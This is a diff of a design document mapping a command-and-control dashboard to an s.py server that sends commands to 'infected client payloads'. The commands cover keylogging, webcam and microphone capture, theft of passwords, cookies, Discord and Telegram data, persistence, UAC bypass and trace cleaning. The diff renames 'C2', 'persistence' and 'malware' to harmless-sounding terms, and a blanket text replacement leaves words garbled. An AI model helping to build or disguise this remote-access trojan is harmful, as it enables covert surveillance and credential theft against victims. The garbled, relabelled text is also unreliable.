@@ -1,4 +1,4 @@
-# C2 Dashboard Features & s.py Backend Mapping
+# Client  Dashboard Features & s.py Backend Mapping
 
 ## Dashboard Components Overview
 
@@ -67,7 +67,7 @@ POST /api/clients/:clientId/remove  # Remove client
   - Handlers: `_start_recording()`, `_stop_recording()`, stream queue
   
 - **Microphone**: Record audio
-  - s.py: `send_command(targets, 'microphone', {'duration': 10})`
+  - s.py: `send_command(targets, 'microphone', {'duappion': 10})`
   
 - **Keylogger**: Log keyboard input
   - s.py: `send_command(targets, 'keylog', {'action': 'dump'})`
@@ -81,7 +81,7 @@ POST /api/clients/:clientId/remove  # Remove client
 - **Webcam Stream**: Live webcam streaming
   - s.py: `send_command(targets, 'webcam_stream', {'action': 'start', 'fps': 10, 'resolution': '640x480'})`
 
-### File Operations (4 types)
+### File Opeappions (4 types)
 - **Download**: Download file from client
   - s.py: `send_command(targets, 'download', {'path': file_path})`
   - Handler: `_save_loot()` → loot table
@@ -134,9 +134,9 @@ POST /api/clients/:clientId/remove  # Remove client
 - **ARP**: ARP table
   - s.py: `send_command(targets, 'arp')`
 
-### Persistence (4 types)
-- **Enable Persistence**: Install persistence
-  - s.py: `send_command(targets, 'persistence')`
+### living (4 types)
+- **Enable living**: Install living
+  - s.py: `send_command(targets, 'living')`
   
 - **Privilege Escalation**: Request admin
   - s.py: `send_command(targets, 'elevate')`
@@ -151,7 +151,7 @@ POST /api/clients/:clientId/remove  # Remove client
 - **Clean Traces**: Remove forensic evidence
   - s.py: `send_command(targets, 'clean_traces')`
   
-- **Self Destruct**: Remove malware
+- **Self Destruct**: Remove preicious app 
   - s.py: `send_command(targets, 'self_destruct')`
   
 - **Abort Tasks**: Abort running tasks
@@ -179,7 +179,7 @@ def _handle_msg(self, cid, msg):
     # Store files in loot directory
 
 # Database logging:
-# Table: loot (for file operations)
+# Table: loot (for file opeappions)
 # Fields: id, client_id, type, filename, path, timestamp
 ```
 
@@ -262,7 +262,7 @@ GET /api/system/netstat/:clientId
 | Files | 4 | download, upload, browse, crypt |
 | Credentials | 5 | passwords, cookies, wifi, discord, telegram |
 | System | 7 | sysinfo, process, registry, scan, av, netstat, arp |
-| Persistence | 4 | persist, elevate, rdp, uac |
+| living | 4 | persist, elevate, rdp, uac |
 | Cleanup | 3 | clean, destroy, abort |
 | **Total** | **34** | - |
 
@@ -272,7 +272,7 @@ GET /api/system/netstat/:clientId
 
 ```
 ┌─────────────────────────────────────┐
-│     C2 Dashboard (React)            │
+│     Client  Dashboard (React)            │
 │  - Sidebar Navigation               │
 │  - Clients Panel                    │
 │  - Command Panel                    │
@@ -288,8 +288,8 @@ GET /api/system/netstat/:clientId
 └──────────────┬──────────────────────┘
                │ Socket / Database Query
 ┌──────────────▼──────────────────────┐
-│     s.py C2 Server                  │
-│  - AdvancedC2Server                 │
+│     s.py Client  Server                  │
+│  - AdvancedClient Server                 │
 │  - DatabaseManager (SQLite)         │
 │  - CommandParser                    │
 │  - CryptoManager                    │
@@ -298,8 +298,8 @@ GET /api/system/netstat/:clientId
 ┌──────────────▼──────────────────────┐
 │     Infected Client Payloads        │
 │  - Command Execution                │
-│  - Data Exfiltration                │
-│  - Persistence                      │
+│  - Data Exfiltappion                │
+│  - living                      │
 └─────────────────────────────────────┘
 ```
 
@@ -312,7 +312,7 @@ GET /api/system/netstat/:clientId
 - Commands: All 34 types available
 - Metrics: Simulated time-series data
 
-**Real Integration** Needed:
+**Real Integappion** Needed:
 - SWR for data fetching with caching
 - WebSocket for real-time updates
 - Local state for UI interactions
@@ -334,7 +334,7 @@ GET /api/system/netstat/:clientId
 
 ---
 
-## Integration Checklist
+## Integappion Checklist
 
 - [ ] Create `/api/clients` endpoint
 - [ ] Create `/api/commands/execute` endpoint
@@ -366,9 +366,9 @@ GET /api/system/netstat/:clientId
 - [ ] Client connection/disconnection
 - [ ] Command delivery
 - [ ] Response handling
-- [ ] Database operations
+- [ ] Database opeappions
 - [ ] Encryption/decryption
-- [ ] File operations
+- [ ] File opeappions
 - [ ] Concurrent command execution
 - [ ] Error scenarios
 
@@ -393,11 +393,11 @@ GET /api/system/netstat/:clientId
 ## Future Enhancement Ideas
 
 1. **Command Templating**: Save and reuse command sets
-2. **Batch Operations**: Execute commands on multiple clients simultaneously
+2. **Batch Opeappions**: Execute commands on multiple clients simultaneously
 3. **Scheduling**: Schedule commands for specific times
-4. **Webhooks**: Integration with external services
+4. **Webhooks**: Integappion with external services
 5. **Custom Payloads**: Build and deploy custom payloads
-6. **Team Collaboration**: Multi-user access with roles
+6. **Team Collaboappion**: Multi-user access with roles
 7. **API Access**: REST API for external tools
 8. **Mobile Dashboard**: Mobile-responsive interface
 9. **Command History**: Searchable command audit log
